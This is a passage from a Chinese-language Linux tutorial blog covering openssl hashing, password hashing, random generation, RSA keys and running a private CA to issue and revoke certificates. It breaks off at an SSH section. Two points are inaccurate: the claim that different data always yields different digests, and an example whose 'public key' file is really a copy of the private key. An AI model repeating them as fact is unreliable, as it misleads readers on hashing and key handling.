class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">JXU0ZjYwJXU1OTdkJXVmZjAxJXU2MjExJXU2NjJmd2lsbG9uZWRheSV1ZmYwYyV1NTNlZiV1NGVlNSV1N2VkOSV1NjIxMSV1NGUyYSV1NTE3MyV1NmNlOCV1NTQxNyV1ZmYxZgo=<br><br><span class="hljs-comment">#步骤1</span><br>[root@rocky01 ~]<span class="hljs-comment"># echo JXU0ZjYwJXU1OTdkJXVmZjAxJXU2MjExJXU2NjJmd2lsbG9uZWRheSV1ZmYwYyV1NTNlZiV1NGVlNSV1N2VkOSV1NjIxMSV1NGUyYSV1NTE3MyV1NmNlOCV1NTQxNyV1ZmYxZgo= |base64 -d</span><br>%u4f60%u597d%uff01%u6211%u662fwilloneday%uff0c%u53ef%u4ee5%u7ed9%u6211%u4e2a%u5173%u6ce8%u5417%uff1f<br><br><span class="hljs-comment">#步骤2</span><br><span class="hljs-comment">#使用unicode编码转换所得上述代码</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-openssl-命令"><a href="#2-openssl-命令" class="headerlink" title="2 openssl 命令"></a>2 openssl 命令</h2><blockquote><p> 两种运行模式：</p><ul><li>交互模式</li><li>批处理模式</li></ul><p>三种子命令：</p><ul><li>标准命令</li><li>消息摘要命令</li><li>加密命令</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl version</span><br>OpenSSL 1.1.1k  FIPS 25 Mar 2021<br><br>[root@rocky01 ~]<span class="hljs-comment"># openssl help</span><br>Standard commands<br>asn1parse         ca                ciphers           cms<br>crl               crl2pkcs7         dgst              dhparam<br>dsa               dsaparam          ec                ecparam<br>...省略...<br></code></pre></td></tr></table></figure><h3 id="2-1-openssl命令单向哈希加密"><a href="#2-1-openssl命令单向哈希加密" class="headerlink" title="2.1 openssl命令单向哈希加密"></a>2.1 openssl命令单向哈希加密</h3><p>工具：openssl dgst</p><p>算法：md5sum, sha1sum, sha224sum,sha256sum…</p><p>dgst 命令：帮助：man dgst</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat test.txt</span><br>abc<br>[root@rocky01 ~]<span class="hljs-comment"># openssl md5 test.txt</span><br>MD5(test.txt)= 0bee89b07a248e27c83fc3d5951213c1<br>[root@rocky01 ~]<span class="hljs-comment"># cat &gt; test.txt</span><br>abcd<br>^C<br>[root@rocky01 ~]<span class="hljs-comment"># openssl md5 test.txt</span><br>MD5(test.txt)= f5ac8127b3b6b85cdc13f237c6005d80<br>[root@rocky01 ~]<span class="hljs-comment"># cat &gt; test.txt</span><br>abc<br>^C<br>[root@rocky01 ~]<span class="hljs-comment"># openssl md5 test.txt</span><br>MD5(test.txt)= 0bee89b07a248e27c83fc3d5951213c1<br><br><span class="hljs-comment">#hash总结</span><br>1 单向<br>2 data 相同，digest必相同<br>3 data不相同，digest必不相同<br>4 <span class="hljs-built_in">hash</span>算法固定，则digest的长度固定<br>5 data发生轻微变化，而digest会发生巨大的变化<br></code></pre></td></tr></table></figure><hr><h3 id="2-2-openssl-命令生成用户密码"><a href="#2-2-openssl-命令生成用户密码" class="headerlink" title="2.2 openssl 命令生成用户密码"></a>2.2 openssl 命令生成用户密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl passwd --help</span><br>Usage: passwd [options]<br>Valid options are:<br> -<span class="hljs-built_in">help</span>               Display this summary<br> -<span class="hljs-keyword">in</span> infile          Read passwords from file<br> -noverify           Never verify when reading password from terminal<br> -quiet              No warnings<br> -table              Format output as table<br> -reverse            Switch table columns<br> -salt val           Use provided salt<br> -stdin              Read passwords from stdin<br> -6                  SHA512-based password algorithm<br> -5                  SHA256-based password algorithm<br> -apr1               MD5-based password algorithm, Apache variant<br> -1                  MD5-based password algorithm<br> -aixmd5             AIX MD5-based password algorithm<br> -crypt              Standard Unix password algorithm (default)<br> -rand val           Load the file(s) into the random number generator<br> -writerand outfile  Write random data to the specified file<br></code></pre></td></tr></table></figure><h4 id="范例：使用方法"><a href="#范例：使用方法" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl passwd -6 123456</span><br>$6<span class="hljs-variable">$T3SqZyPPgbzy5He</span>/<span class="hljs-variable">$Zv7rn1</span>.I/93LDe0EulS1npLzOX4fObgj/g5S4WLGfnVn7nfvZUMRJdZFHt8F0FRrVK1y1Hzz9nY2XpW52AN0D/<br>[root@rocky01 ~]<span class="hljs-comment"># openssl passwd -6 -salt &quot;T3SqZyPPgbzy5He/&quot; 123456</span><br>$6<span class="hljs-variable">$T3SqZyPPgbzy5He</span>/<span class="hljs-variable">$Zv7rn1</span>.I/93LDe0EulS1npLzOX4fObgj/g5S4WLGfnVn7nfvZUMRJdZFHt8F0FRrVK1y1Hzz9nY2XpW52AN0D/<br>[root@rocky01 ~]<span class="hljs-comment"># openssl passwd -6 123456</span><br>$6$1pNhebfUlcTAtz1k<span class="hljs-variable">$cTDbrNHNcF5IFOfv31FILNTKnwbf</span>/BFkmFbB1trGXHa3trgENepAodueNJULiT1RAPWbABeG7Iwisk/rj4uiD1<br><br><span class="hljs-comment">#结论</span><br>第二个$和第三个$的值（salt）一样，则生成的密码一样<br></code></pre></td></tr></table></figure><hr><h3 id="2-3-openssl命令生成随机数"><a href="#2-3-openssl命令生成随机数" class="headerlink" title="2.3 openssl命令生成随机数"></a>2.3 openssl命令生成随机数</h3><p>随机数生成器：伪随机数字，利用键盘和鼠标，块设备中断生成随机数</p><h4 id="范例：生成随机10位长度密码"><a href="#范例：生成随机10位长度密码" class="headerlink" title="范例：生成随机10位长度密码"></a><strong>范例：生成随机10位长度密码</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl rand -base64 9 |head -c10</span><br>JbxYH0ISvr<br></code></pre></td></tr></table></figure><hr><h3 id="2-4-openssl命令实现-PKI"><a href="#2-4-openssl命令实现-PKI" class="headerlink" title="2.4 openssl命令实现 PKI"></a>2.4 openssl命令实现 PKI</h3><blockquote><p>公钥加密：</p><ul><li>算法：RSA, ELGamal</li><li>工具：gpg, openssl rsautl（man rsautl）</li></ul><p>数字签名：</p><ul><li>算法：RSA, DSA, ELGamal</li></ul><p>密钥交换：</p><ul><li>算法：dh</li></ul><p>DSA：Digital Signature Algorithm</p><p>DSS：Digital Signature Standard</p><p>RSA：openssl命令生成密钥对儿：man genrsa</p></blockquote><h4 id="生成公钥和私钥"><a href="#生成公钥和私钥" class="headerlink" title="生成公钥和私钥"></a>生成公钥和私钥</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">openssl genrsa -out /PATH/<span class="hljs-selector-tag">TO</span>/PRIVATEKEY<span class="hljs-selector-class">.FILE</span> <span class="hljs-selector-attr">[-aes128]</span> <span class="hljs-selector-attr">[-aes192]</span> <span class="hljs-selector-attr">[-aes256]</span> <span class="hljs-selector-attr">[- des3]</span> <span class="hljs-selector-attr">[NUM_BITS,默认2048]</span><br></code></pre></td></tr></table></figure><p><strong>注：centos8以下版本创建后的文件权限为644，centos8为600</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#可选加密[-aes128]等</span><br>[root@rocky01 ~]<span class="hljs-comment"># openssl genrsa -out /test/app1.key</span><br>Generating RSA private key, 2048 bit long modulus (2 primes)<br>........................+++++<br>..........................................................+++++<br>e is 65537 (0x010001)<br><br>[root@rocky01 ~]<span class="hljs-comment"># cat /test/app1.key</span><br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEowIBAAKCAQEAt/E7JRD0OULSCF5sDGygefUdig4mK6w5A+jxsjFSGeAfNXWX<br>mpPSCq5ig0JJY/6MlK+dL6hVobOdDzOC+EmNMw9DdfkM3hLkBxJ+HG/52byo4V/H<br>...省略...<br><br>[root@rocky01 ~]<span class="hljs-comment"># openssl rsa -in /test/app1.key -out /test/app1.pubkey</span><br>writing RSA key<br>[root@rocky01 ~]<span class="hljs-comment"># ll /test/</span><br>total 8<br>-rw------- 1 root root 1675 Oct 18 01:59 app1.key<br>-rw------- 1 root root 1675 Oct 18 02:17 app1.pubkey<br>[root@rocky01 ~]<span class="hljs-comment"># cat /test/app1.pubkey</span><br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEowIBAAKCAQEAt/E7JRD0OULSCF5sDGygefUdig4mK6w5A+jxsjFSGeAfNXWX<br>mpPSCq5ig0JJY/6MlK+dL6hVobOdDzOC+EmNMw9DdfkM3hLkBxJ+HG/52byo4V/H<br>...省略...<br></code></pre></td></tr></table></figure><h4 id="范例-从私钥中提取出公钥"><a href="#范例-从私钥中提取出公钥" class="headerlink" title="范例: 从私钥中提取出公钥"></a>范例: 从私钥中提取出公钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsa -<span class="hljs-keyword">in</span> PRIVATEKEYFILE -pubout -out PUBLICKEYFILE<br></code></pre></td></tr></table></figure><hr><h2 id="3-建立私有CA实现证书申请颁发"><a href="#3-建立私有CA实现证书申请颁发" class="headerlink" title="3 建立私有CA实现证书申请颁发"></a>3 建立私有CA实现证书申请颁发</h2><blockquote><p>建立私有CA：</p><ul><li>OpenCA：OpenCA开源组织使用Perl对OpenSSL进行二次开发而成的一套完善的PKI免费软件</li><li>openssl：相关包 openssl和openssl-libs</li></ul><p><strong>证书申请及签署步骤：</strong></p><p><strong>1、生成证书申请请求</strong></p><p><strong>2、RA核验</strong></p><p><strong>3、CA签署</strong></p><p><strong>4、获取证书</strong></p></blockquote><h3 id="openssl-libs-包"><a href="#openssl-libs-包" class="headerlink" title="openssl-libs 包"></a>openssl-libs 包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># rpm -ql openssl-libs</span><br>/etc/pki/tls<br>/etc/pki/tls/certs<br>/etc/pki/tls/ct_log_list.cnf<br>/etc/pki/tls/misc<br>/etc/pki/tls/openssl.cnf<br>/etc/pki/tls/private<br>...省略...<br></code></pre></td></tr></table></figure><h3 id="openssl的配置文件"><a href="#openssl的配置文件" class="headerlink" title="openssl的配置文件"></a>openssl的配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/pki/tls/openssl.cnf<br></code></pre></td></tr></table></figure><h3 id="三种策略"><a href="#三种策略" class="headerlink" title="三种策略"></a>三种策略</h3><p>match匹配、optional可选、supplied提供</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">match：要求申请填写的信息跟CA设置信息必须一致<br>optional：可有可无，跟CA设置信息可不一致<br>supplied：必须填写这项申请信息<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># cat /etc/pki/tls/openssl.cnf</span><br>...省略...<br>[ policy_match ]<br>countryName= match<br>stateOrProvinceName= match<br>organizationName= match<br>organizationalUnitName= optional<br>commonName= supplied<br>emailAddress= optional<br>...省略...<br></code></pre></td></tr></table></figure><hr><h3 id="3-1-创建创建私有CA"><a href="#3-1-创建创建私有CA" class="headerlink" title="3.1 创建创建私有CA"></a>3.1 创建创建私有CA</h3><h4 id="（1）创建CA所需要的文件"><a href="#（1）创建CA所需要的文件" class="headerlink" title="（1）创建CA所需要的文件"></a>（1）创建CA所需要的文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1、创建CA所需要的文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># mkdir -p /etc/pki/CA/&#123;certs,crl,newcerts,private&#125;</span><br><span class="hljs-comment">#生成证书索引数据库文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># touch /etc/pki/CA/index.txt</span><br><span class="hljs-comment">#指定第一个颁发证书的序列号</span><br>[root@rocky01 ~]<span class="hljs-comment"># echo 01 &gt; /etc/pki/CA/serial</span><br></code></pre></td></tr></table></figure><h4 id="（2）生成CA私钥"><a href="#（2）生成CA私钥" class="headerlink" title="（2）生成CA私钥"></a>（2）生成CA私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl genrsa -out private/cakey.pem</span><br>Generating RSA private key, 2048 bit long modulus (2 primes)<br>................................................................................................................................................+++++<br>.........................................................................................................+++++<br>e is 65537 (0x010001)<br><br><span class="hljs-comment">#注：centos8以下版本建议umask修改权限后创建</span><br><span class="hljs-comment">#[root@centos7 CA]# (umask 066; openssl genrsa -out private/cakey.pem)</span><br></code></pre></td></tr></table></figure><h4 id="（3）生成CA自签名证书"><a href="#（3）生成CA自签名证书" class="headerlink" title="（3）生成CA自签名证书"></a>（3）生成CA自签名证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -days 3650 -out /etc/pki/CA/cacert.pem</span><br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter <span class="hljs-string">&#x27;.&#x27;</span>, the field will be left blank.<br>-----<br>Country Name (2 letter code) [XX]:CN<br>State or Province Name (full name) []:GuangDong<br>Locality Name (eg, city) [Default City]:Guangzhou<br>Organization Name (eg, company) [Default Company Ltd]:Willoneday <span class="hljs-comment">###公司名###</span><br>Organizational Unit Name (eg, section) []:Dream <span class="hljs-comment">###部门###</span><br>Common Name (eg, your name or your server<span class="hljs-string">&#x27;s hostname) []:ca.willoneday.org</span><br><span class="hljs-string">Email Address []:willoneday@qq.com</span><br></code></pre></td></tr></table></figure><blockquote><p> 选项说明</p><ul><li>-new：生成新证书签署请求</li><li>-x509：专用于CA生成自签证书</li><li>-key：生成请求时用到的私钥文件</li><li>-days n：证书的有效期限</li><li>-out /PATH/TO/SOMECERTFILE: 证书的保存路径</li></ul><p>国家代码：<a href="https://country-code.cl/">https://country-code.cl/</a></p></blockquote><h4 id="（4）查看证书中的信息"><a href="#（4）查看证书中的信息" class="headerlink" title="（4）查看证书中的信息"></a>（4）查看证书中的信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl x509 -in /etc/pki/CA/cacert.pem -noout -text</span><br>Certificate:<br>    Data:<br>        Version: 3 (0x2)<br>        Serial Number:<br>            44:11:88:69:b1:8f:2c:15:23:3a:56:2a:d7:50:ee:b2:91:71:bd:2a<br>        Signature Algorithm: sha256WithRSAEncryption<br>        Issuer: C = CN, ST = GuangDong, L = Guangzhou, O = Willoneday, OU = Dream, CN = ca.willoneday.org, emailAddress = willoneday@qq.com<br>        Validity<br>            Not Before: Oct 18 05:12:52 2022 GMT<br>            Not After : Oct 15 05:12:52 2032 GMT<br>        Subject: C = CN, ST = GuangDong, L = Guangzhou, O = Willoneday, OU = Dream, CN = ca.willoneday.org, emailAddress = willoneday@qq.com<br>        Subject Public Key Info:<br></code></pre></td></tr></table></figure><hr><h3 id="3-2-申请证书并颁发证书"><a href="#3-2-申请证书并颁发证书" class="headerlink" title="3.2 申请证书并颁发证书"></a>3.2 申请证书并颁发证书</h3><h4 id="（1）为需要使用证书的主机生成生成私钥"><a href="#（1）为需要使用证书的主机生成生成私钥" class="headerlink" title="（1）为需要使用证书的主机生成生成私钥"></a>（1）为需要使用证书的主机生成生成私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl genrsa -out /test/www.key</span><br>Generating RSA private key, 2048 bit long modulus (2 primes)<br>.................+++++<br>......................................................+++++<br>e is 65537 (0x010001)<br></code></pre></td></tr></table></figure><h4 id="（2）为需要使用证书的主机生成证书申请文件"><a href="#（2）为需要使用证书的主机生成证书申请文件" class="headerlink" title="（2）为需要使用证书的主机生成证书申请文件"></a>（2）为需要使用证书的主机生成证书申请文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># openssl req -new -key /test/www.key -out /test/www.csr</span><br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter <span class="hljs-string">&#x27;.&#x27;</span>, the field will be left blank.<br>-----<br>Country Name (2 letter code) [XX]:CN<br>State or Province Name (full name) []:GuangDong<br>Locality Name (eg, city) [Default City]:Guangzhou<br>Organization Name (eg, company) [Default Company Ltd]:Willoneday<br>Organizational Unit Name (eg, section) []:Dream<br>Common Name (eg, your name or your server<span class="hljs-string">&#x27;s hostname) []:www.willoneday.org</span><br><span class="hljs-string">Email Address []:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Please enter the following &#x27;</span>extra<span class="hljs-string">&#x27; attributes</span><br><span class="hljs-string">to be sent with your certificate request</span><br><span class="hljs-string">A challenge password []:</span><br><span class="hljs-string">An optional company name []:</span><br></code></pre></td></tr></table></figure><h4 id="（3）在CA签署证书并将证书颁发给请求者"><a href="#（3）在CA签署证书并将证书颁发给请求者" class="headerlink" title="（3）在CA签署证书并将证书颁发给请求者"></a>（3）在CA签署证书并将证书颁发给请求者</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl ca -in /test/www.csr -out /etc/pki/CA/certs/www.crt -days 100</span><br>Using configuration from /etc/pki/tls/openssl.cnf<br>Check that the request matches the signature<br>Signature ok<br>Certificate Details:<br>        Serial Number: 1 (0x1)<br>        Validity<br>            Not Before: Oct 18 05:40:54 2022 GMT<br>            Not After : Jan 26 05:40:54 2023 GMT<br>        Subject:<br>            countryName               = CN<br>            stateOrProvinceName       = GuangDong<br>            organizationName          = Willoneday<br>            organizationalUnitName    = Dream<br>            commonName                = www.willoneday.org<br>        X509v3 extensions:<br>            X509v3 Basic Constraints:<br>                CA:FALSE<br>            Netscape Comment:<br>                OpenSSL Generated Certificate<br>            X509v3 Subject Key Identifier:<br>                AF:DE:3F:02:73:72:29:B4:2D:0F:7E:8D:DA:15:CB:07:CB:EE:9A:2D<br>            X509v3 Authority Key Identifier:<br>                keyid:28:75:5C:54:19:73:FE:84:6E:D9:DC:83:46:72:6F:0A:2B:6B:B8:85<br><br>Certificate is to be certified until Jan 26 05:40:54 2023 GMT (100 days)<br>Sign the certificate? [y/n]:y<br><br><br>1 out of 1 certificate requests certified, commit? [y/n]y<br>Write out database with 1 new entries<br>Data Base Updated<br><br><span class="hljs-comment">#注：这里如果没有创建以下两个文件会报错</span><br><span class="hljs-comment">#生成证书索引数据库文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># touch /etc/pki/CA/index.txt</span><br><span class="hljs-comment">#指定第一个颁发证书的序列号</span><br>[root@rocky01 ~]<span class="hljs-comment"># echo 01 &gt; /etc/pki/CA/serial</span><br></code></pre></td></tr></table></figure><h4 id="（4）查看证书中的信息-状态"><a href="#（4）查看证书中的信息-状态" class="headerlink" title="（4）查看证书中的信息/状态"></a>（4）查看证书中的信息/状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看证书信息</span><br>openssl x509 -<span class="hljs-keyword">in</span> /PATH/FROM/CERT_FILE -noout   -text|issuer|subject|serial|dates<br>或<br><span class="hljs-built_in">cat</span> /etc/pki/CA/certs/*.crt<br><br><span class="hljs-comment">#查看指定编号的证书状态</span><br>openssl ca -status SERIAL<br></code></pre></td></tr></table></figure><hr><h3 id="3-3-吊销证书"><a href="#3-3-吊销证书" class="headerlink" title="3.3 吊销证书"></a>3.3 吊销证书</h3><h4 id="（1）吊销证书"><a href="#（1）吊销证书" class="headerlink" title="（1）吊销证书"></a>（1）吊销证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl ca -status 01</span><br>Using configuration from /etc/pki/tls/openssl.cnf<br>01=Valid (V)<br>[root@rocky01 CA]<span class="hljs-comment"># openssl ca -revoke /etc/pki/CA/newcerts/01.pem</span><br>Using configuration from /etc/pki/tls/openssl.cnf<br>Revoking Certificate 01.<br>Data Base Updated<br>[root@rocky01 CA]<span class="hljs-comment"># openssl ca -status 01</span><br>Using configuration from /etc/pki/tls/openssl.cnf<br>01=Revoked (R)<br></code></pre></td></tr></table></figure><h4 id="（2）生成吊销列表"><a href="#（2）生成吊销列表" class="headerlink" title="（2）生成吊销列表"></a>（2）生成吊销列表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># echo 01 &gt; /etc/pki/CA/crlnumber</span><br></code></pre></td></tr></table></figure><h4 id="（3）更新证书吊销列表"><a href="#（3）更新证书吊销列表" class="headerlink" title="（3）更新证书吊销列表"></a>（3）更新证书吊销列表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl ca -gencrl -out /etc/pki/CA/crl.pem</span><br>Using configuration from /etc/pki/tls/openssl.cnf<br></code></pre></td></tr></table></figure><h4 id="（4）查看crl吊销文件"><a href="#（4）查看crl吊销文件" class="headerlink" title="（4）查看crl吊销文件"></a>（4）查看crl吊销文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 CA]<span class="hljs-comment"># openssl crl -in /etc/pki/CA/crl.pem -noout -text</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-4-CentOS7-创建自签名证书"><a href="#3-4-CentOS7-创建自签名证书" class="headerlink" title="3.4 CentOS7 创建自签名证书"></a>3.4 CentOS7 创建自签名证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#进到/etc/pki/tls/certs目录下，mkae</span><br>[root@centos7 ~]<span class="hljs-comment">#cd /etc/pki/tls/certs</span><br>[root@centos7 certs]<span class="hljs-comment">#make</span><br>This makefile allows you to create:<br> o public/private key pairs<br> o SSL certificate signing requests (CSRs)<br> o self-signed SSL <span class="hljs-built_in">test</span> certificates<br> ...省略...<br></code></pre></td></tr></table></figure><hr><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="三、ssh服务"><a href="#三、ssh服务" class="headerlink" title="三、ssh服务"></a>三、ssh服务</h1><h2 id="1-ssh服务介绍"><a href="#1-ssh服务介绍" class="headerlink" title="1 ssh服务介绍"></a>1 ssh服务介绍</h2><p>ssh: secure shell protocol, 22/tcp, <strong>安全的远程登录，实现加密通信，代替传统的 telnet 协议</strong></p><h3 id="1-1-公钥交换原理"><a href="#1-1-公钥交换原理" class="headerlink" title="1.1 公钥交换原理"></a>1.1 公钥交换原理</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018142750302-1970532597.png"><img src="2927659-20221018142750302-1970532597.png" 